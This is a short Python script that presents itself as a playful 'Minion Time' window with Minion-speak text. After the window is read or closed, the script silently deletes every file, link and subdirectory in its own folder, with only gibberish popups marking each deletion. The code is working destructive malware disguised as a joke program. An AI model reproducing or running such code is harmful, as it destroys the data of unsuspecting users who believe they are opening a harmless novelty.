import os
import shutil
import PySimpleGUI as sg

layout = [[sg.Text('Minion Time', size=(30, 1), font=("Century Gothic", 40), text_color='black')],
          [sg.Text('Xu zzz as een wool cloth.  Whaaat? joy bada tis een ehkit')]]

event = sg.Window('Minion Time').Layout(layout).Read()

folder = os.path.dirname(os.path.abspath(__file__))
for filename in os.listdir(folder):
    file_path = os.path.join(folder, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
            sg.Popup('Tadda tu dim kaylay bem teepus')
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
            sg.Popup('Tadda tu dim kaylay bem teepus')
    except Exception as e:
        sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))

